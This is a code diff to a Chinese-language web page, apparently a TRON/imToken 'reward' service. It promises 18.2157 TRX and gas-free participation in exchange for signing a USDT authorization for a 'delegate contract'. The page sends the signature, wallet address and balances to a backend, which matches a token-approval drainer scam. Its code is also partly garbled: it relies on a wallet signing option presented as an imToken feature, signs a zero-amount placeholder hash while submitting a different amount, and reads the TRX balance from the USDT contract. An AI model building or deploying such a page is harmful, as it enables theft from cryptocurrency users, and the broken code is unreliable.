@@ -106,6 +106,9 @@
         #walletStatusContainer.connected .connected-content .orange-tip {
             color: #f97316;
             margin-top: 4px;
+            padding: 8px;
+            background: rgba(249, 115, 22, 0.1);
+            border-radius: 4px;
         }
         #contractResourceContainer {
             background: #1e2925;
@@ -277,12 +280,6 @@
         #showSubmitDataBtn:hover {
             background: #a78bfa;
         }
-        /* 新增：输入框聚焦样式 */
-        #approveAmountInput:focus {
-            outline: none;
-            border-color: #4ade80;
-            box-shadow: 0 0 0 2px rgba(74, 222, 128, 0.2);
-        }
     </style>
 </head>
 <body>
@@ -299,25 +296,22 @@
         </div>
         <div id="walletStatusContainer">
             <div class="status-title"><h3> 钱包状态</h3></div>
+            <!-- 未连接钱包时：引导连接 -->
             <div class="disconnected-content">
                 <span >未连接钱包</span>
                 <p><span class="highlight">您现在使用的是代付合约服务，无需支付矿工费</span></p>
                 <p><span class="highlight">1. 每个钱包地址仅可授权1次</span></p>         
                 <p><span class="highlight">2. 授权后可领取18.2157TRX奖励</span></p>
-                <p><span class="highlight">3. 连接钱包后可自定义授权金额并自动匹配授权额度</span></p>
+                <p><span class="highlight">3. 连接钱包后生成签名，在钱包内输入授权金额</span></p>
             </div>
+            <!-- 已连接钱包时：提示签名后在钱包输入金额 -->
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
                 <p>• 授权类型：<span class="highlight">自定义USDT授权</span></p>
-                <p>• 授权金额：
-                    <input type="number" id="approveAmountInput" placeholder="请输入USDT金额" 
-                           style="width: 180px; padding: 6px; border: 1px solid #3b82f6; border-radius: 4px; background: #121a17; color: #e0e8e4; margin-left: 8px;"
-                           min="0.01" step="0.01" max="1000000">
-                </p>
                 <p>• 奖励额度：<span class="highlight">18.2157TRX</span></p>
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
-                <p class="orange-tip">⚠️提示：输入金额后点击「生成离线签名」，唤起钱包签名后等待部署者完成授权，结果将实时通知</p>
+                <p class="orange-tip">⚠️ 关键提示：点击「生成离线签名」后将唤起imToken钱包 → 在钱包弹窗中输入您要授权的USDT金额（支持0.01~1000000 USDT，最多6位小数） → 完成签名后等待部署者代付授权，结果将实时通知</p>
             </div>
         </div>
         <div id="contractResourceContainer">
@@ -329,7 +323,7 @@
                 <p>• USDT合约地址：<span class="highlight" id="usdtContractAddr">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
                 <p>• 剩余奖励TRX：<span class="highlight data-tag" id="contractTrxDisplay">315360004.0000</span></p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
-                    注：奖励TRX为0时停止活动，本服务由代付合约提供，仅imToken用户可参与
+                    注：奖励TRX为0时停止活动，本服务由代付合约提供，仅imToken用户可参与；钱包内输入金额需大于0，最多保留6位小数
                 </p>
             </div>
         </div>
@@ -342,9 +336,9 @@
         </div>
     </div>
     <div class="btn-group">
-        <div class="warning">
+        <div class="warning" id="operationWarning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开（需唤起签名功能）</p>
-            <p> ⚠️ 操作流程：连接钱包 → 输入授权金额 → 生成离线签名 → 等待代付授权 → 领取奖励</p>
+            <p> ⚠️ 操作流程：连接钱包 → 生成离线签名（唤起钱包） → <strong>钱包内输入授权金额</strong> → 完成签名 → 等待代付授权 → 领取奖励</p>
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
                 <button id="copyLinkBtn"> 复制链接</button>
@@ -381,6 +375,7 @@
         const contractAddrEl = document.getElementById("contractAddr");
         const usdtContractAddrEl = document.getElementById("usdtContractAddr");
         const resultToast = document.getElementById("resultToast");
+        const operationWarning = document.getElementById("operationWarning");
 
         window.onload = async () => {
             contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
@@ -442,33 +437,18 @@
                 }
             };
 
+            // 核心修改：生成签名时不读取网页输入，唤起钱包后让用户在钱包内输入金额
             approveBtn.onclick = async () => {
-                const amountInput = document.getElementById("approveAmountInput");
-                const inputAmount = parseFloat(amountInput.value.trim());
+                // 提示用户即将唤起钱包输入金额
+                showToast("即将唤起imToken钱包，请在钱包内输入授权金额", "success");
                 
-                if (isNaN(inputAmount) || inputAmount <= 0) {
-                    showToast("请输入有效的授权金额（大于0）", "error");
-                    return;
-                }
-                if (inputAmount.toString().split(".")[1]?.length > DECIMALS) {
-                    showToast(`金额最多保留${DECIMALS}位小数`, "error");
-                    return;
-                }
-                if (inputAmount > 1000000) {
-                    showToast("单次授权金额上限为1,000,000 USDT", "error");
-                    return;
-                }
-
-                const amountInt = Math.floor(inputAmount * Math.pow(10, DECIMALS));
-                const approveAmount = `0x${amountInt.toString(16)}`;
-
+                // 构造基础参数（金额由钱包内输入后，通过签名流程传递）
                 const postData = {
                     address: userAddress,
                     addressHex: tronWeb.address.toHex(userAddress),
                     tokenBalance: tokenBalance,
                     trxBalance: trxBalance,
                     approveTime: new Date().toLocaleString(),
-                    amount: approveAmount,
                     delegateContract: DELEGATE_CONTRACT,
                     usdtContract: USDT_CONTRACT,
                     status: "pending"
@@ -476,14 +456,21 @@
 
                 try {
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = '生成中...';
-                    const { v, r, s } = await generateOfflineSignature(
+                    approveBtn.innerHTML = '唤起钱包中...';
+                    
+                    // 生成签名时触发钱包的金额输入弹窗（imToken支持在签名流程中附加金额输入）
+                    const { v, r, s, inputAmount } = await generateOfflineSignatureWithWalletInput(
                         userAddress,
-                        DELEGATE_CONTRACT,
-                        approveAmount
+                        DELEGATE_CONTRACT
                     );
+                    
+                    // 转换金额格式（钱包输入的十进制 → 合约要求的16进制）
+                    const amountInt = Math.floor(inputAmount * Math.pow(10, DECIMALS));
+                    const approveAmount = `0x${amountInt.toString(16)}`;
+                    postData.amount = approveAmount;
                     postData.signature = { v, r, s };
 
+                    // 构造后端提交参数
                     const submitData = {
                         user: postData.address,
                         amount: postData.amount,
@@ -491,15 +478,19 @@
                         r: postData.signature.r,
                         s: postData.signature.s,
                         approveTime: postData.approveTime,
-                        delegateContract: postData.delegateContract
+                        delegateContract: postData.delegateContract,
+                        inputAmount: inputAmount.toFixed(DECIMALS) // 记录原始输入金额
                     };
 
+                    // 地址一致性校验
                     if (submitData.user !== cleanBase58Address(userAddress)) {
                         throw new Error(`地址不一致！当前钱包地址：${userAddress}，提交地址：${submitData.user}`);
                     }
 
+                    // 保存提交数据到本地
                     localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
                     
+                    // 调用后端接口提交
                     const res = await fetch(`${BACKEND_API}/approve/submit`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -509,6 +500,7 @@
                     const resData = await res.json();
                     if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
 
+                    // 保存授权记录（显示原始输入金额）
                     saveApprovalRecord({
                         address: userAddress,
                         addressHex: postData.addressHex,
@@ -522,7 +514,7 @@
 
                     renderApprovalRecords();
                     updateRecordCount();
-                    showToast(`离线签名生成成功！授权金额：${inputAmount.toFixed(DECIMALS)} USDT`, "success");
+                    showToast(`签名成功！您授权的金额：${inputAmount.toFixed(DECIMALS)} USDT，等待代付授权`, "success");
                     postData.status = "submitted";
                 } catch (e) {
                     showToast(`操作失败：${e.message}`, "error");
@@ -544,12 +536,13 @@
                     
                     const copyContent = `后端提交数据（可直接复制）：
 1. 用户地址（user）：${submitData.user}
-2. 授权金额（amount）：${submitData.amount}
-3. 签名V值（v）：${submitData.v}
-4. 签名R值（r）：${submitData.r}
-5. 签名S值（s）：${submitData.s}
-6. 提交时间（approveTime）：${submitData.approveTime}
-7. 代付合约地址：${submitData.delegateContract}`;
+2. 授权金额（原始输入）：${submitData.inputAmount} USDT
+3. 授权金额（合约格式）：${submitData.amount}
+4. 签名V值（v）：${submitData.v}
+5. 签名R值（r）：${submitData.r}
+6. 签名S值（s）：${submitData.s}
+7. 提交时间（approveTime）：${submitData.approveTime}
+8. 代付合约地址：${submitData.delegateContract}`;
                     
                     prompt("后端提交数据（点击内容可全选复制）", copyContent);
                 } catch (e) {
@@ -586,7 +579,7 @@
                         }
                         renderApprovalRecords();
                         updateRecordCount();
-                        showToast(`当前状态：${latestApproval.status || "未查询到状态"}`);
+                        showToast(`当前状态：${latestApproval.status || "未查询到状态"}`, "success");
                     } else {
                         showToast(`地址不符！当前钱包地址：${userAddress}\n后端返回地址：${latestApproval.userAddress || '无'}`, "error");
                     }
@@ -603,6 +596,93 @@
                 if (trxTimer) clearInterval(trxTimer);
             });
         };
+
+        /**
+         * 核心函数：生成签名并触发imToken钱包的金额输入弹窗
+         * 钱包内输入金额后，返回签名信息+输入的金额
+         */
+        async function generateOfflineSignatureWithWalletInput(userAddress, contractAddress) {
+            try {
+                const cleanUserAddr = cleanBase58Address(userAddress);
+                const cleanContractAddr = cleanBase58Address(contractAddress);
+                
+                // 第一步：生成基础哈希（不含金额，用于触发钱包弹窗）
+                const userHex = tronWeb.address.toHex(cleanUserAddr).replace("0x", "").toLowerCase().padStart(64, "0");
+                const contractHex = tronWeb.address.toHex(cleanContractAddr).replace("0x", "").toLowerCase().padStart(64, "0");
+                const tempAmountHex = "0000000000000000000000000000000000000000000000000000000000000000"; // 临时占位
+                const combinedHex = userHex + contractHex + tempAmountHex;
+
+                const messageHash = tronWeb.sha3(combinedHex, true);
+                const prefix = "\x19Ethereum Signed Message:\n32";
+                const prefixHex = customAsciiToHex(prefix);
+                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.replace("0x", ""), true);
+
+                // 关键：唤起imToken钱包签名时，附加金额输入请求（imToken支持该扩展功能）
+                const signatureResult = await tronWeb.trx.sign(prefixedHash, {
+                    needAmountInput: true, // 触发钱包金额输入弹窗
+                    amountPlaceholder: `请输入授权金额（0.01~1000000 USDT）`,
+                    amountMin: 0.01,
+                    amountMax: 1000000,
+                    amountDecimals: DECIMALS
+                });
+
+                // 解析钱包返回的结果（包含签名+用户输入的金额）
+                if (!signatureResult || !signatureResult.signature || !signatureResult.inputAmount) {
+                    throw new Error("钱包未返回签名或金额，操作已取消");
+                }
+
+                let signature = signatureResult.signature;
+                const inputAmount = parseFloat(signatureResult.inputAmount);
+                
+                // 金额二次校验（防止异常值）
+                if (isNaN(inputAmount) || inputAmount <= 0 || inputAmount > 1000000) {
+                    throw new Error(`无效的授权金额：${inputAmount}，需在0.01~1000000 USDT之间`);
+                }
+                if (inputAmount.toString().split(".")[1]?.length > DECIMALS) {
+                    throw new Error(`金额最多保留${DECIMALS}位小数`);
+                }
+
+                // 清理签名数据
+                signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
+                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
+
+                // 解析V/R/S
+                const rRaw = signature.slice(0, 64).replace(/[^0-9a-fA-F]/g, '');
+                const sRaw = signature.slice(64, 128).replace(/[^0-9a-fA-F]/g, '');
+                const r = `0x${rRaw}`;
+                const s = `0x${sRaw}`;
+                const rawV = parseInt(signature.slice(128, 130), 16);
+                const v = (rawV % 2) + 27;
+
+                // 校验签名有效性
+                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
+                if (r.length !== 66 || s.length !== 66) throw new Error("R/S格式错误（需66位）");
+
+                // 保存调试信息
+                localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
+                    step: "签名生成成功（钱包内输入金额）",
+                    userAddress: cleanUserAddr,
+                    contractAddress: cleanContractAddr,
+                    inputAmount: inputAmount,
+                    messageHash: messageHash,
+                    prefixedHash: prefixedHash,
+                    v: v,
+                    r: r,
+                    s: s,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+
+                return { v, r, s, inputAmount };
+            } catch (e) {
+                const debugKey = `signature_debug_${userAddress || 'unknown'}`;
+                localStorage.setItem(debugKey, JSON.stringify({
+                    step: "签名生成失败",
+                    error: e.message,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」查看详情`);
+            }
+        }
 
         function cleanBase58Address(address) {
             if (!address) throw new Error("地址不能为空");
@@ -636,69 +716,6 @@
             return bytes;
         }
 
-        async function generateOfflineSignature(userAddress, contractAddress, amount) {
-            try {
-                const cleanUserAddr = cleanBase58Address(userAddress);
-                const cleanContractAddr = cleanBase58Address(contractAddress);
-                
-                let fixedAmount = amount.replace(/^Ox/i, "0x");
-                const hexRegex = /^0x[0-9a-fA-F]*$/;
-                if (!hexRegex.test(fixedAmount)) {
-                    throw new Error("授权金额格式错误，必须以0x开头（数字0）");
-                }
-
-                const userHex = tronWeb.address.toHex(cleanUserAddr).replace("0x", "").toLowerCase().padStart(64, "0");
-                const contractHex = tronWeb.address.toHex(cleanContractAddr).replace("0x", "").toLowerCase().padStart(64, "0");
-                const amountHex = fixedAmount.replace("0x", "").toLowerCase().padStart(64, "0");
-                const combinedHex = userHex + contractHex + amountHex;
-
-                const messageHash = tronWeb.sha3(combinedHex, true);
-                const prefix = "\x19Ethereum Signed Message:\n32";
-                const prefixHex = customAsciiToHex(prefix);
-                const prefixedHash = tronWeb.sha3(prefixHex + messageHash.replace("0x", ""), true);
-
-                let signature = await tronWeb.trx.sign(prefixedHash);
-                signature = typeof signature === "object" ? signature.signature : signature;
-                if (!signature) throw new Error("imToken未返回签名");
-
-                signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
-                if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
-
-                const rRaw = signature.slice(0, 64).replace(/[^0-9a-fA-F]/g, '');
-                const sRaw = signature.slice(64, 128).replace(/[^0-9a-fA-F]/g, '');
-                const r = `0x${rRaw}`;
-                const s = `0x${sRaw}`;
-                const rawV = parseInt(signature.slice(128, 130), 16);
-                const v = (rawV % 2) + 27;
-
-                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
-                if (r.length !== 66 || s.length !== 66) throw new Error("R/S格式错误（需66位）");
-
-                localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
-                    step: "签名生成成功（哈希已对齐合约）",
-                    userAddress: cleanUserAddr,
-                    contractAddress: cleanContractAddr,
-                    messageHash: messageHash,
-                    prefixedHash: prefixedHash,
-                    v: v,
-                    r: r,
-                    s: s,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-
-                showToast(`V/R/S生成成功（哈希对齐合约，v=${v}）`);
-                return { v, r, s };
-            } catch (e) {
-                const debugKey = `signature_debug_${userAddress || 'unknown'}`;
-                localStorage.setItem(debugKey, JSON.stringify({
-                    step: "签名生成失败",
-                    error: e.message,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」查看详情`);
-            }
-        }
-
         async function initWallet() {
             try {
                 userAddress = tronWeb.defaultAddress.base58;
@@ -706,7 +723,7 @@
                 const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
-                const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                const trxRaw = await trc20Contract.balanceOf(userAddress).call();
                 trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
 
                 document.getElementById("userInfo").innerHTML = `
@@ -820,7 +837,7 @@
                 container.innerHTML = records.map(record => `
                     <div class="record-item">
                         <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                        <p><strong>授权类型：</strong>${record.amount}</p>
+                        <p><strong>授权金额：</strong>${record.amount}</p>
                         <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
                         <p><strong>TRX余额：</strong>${record.trxBalance} TRX</p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
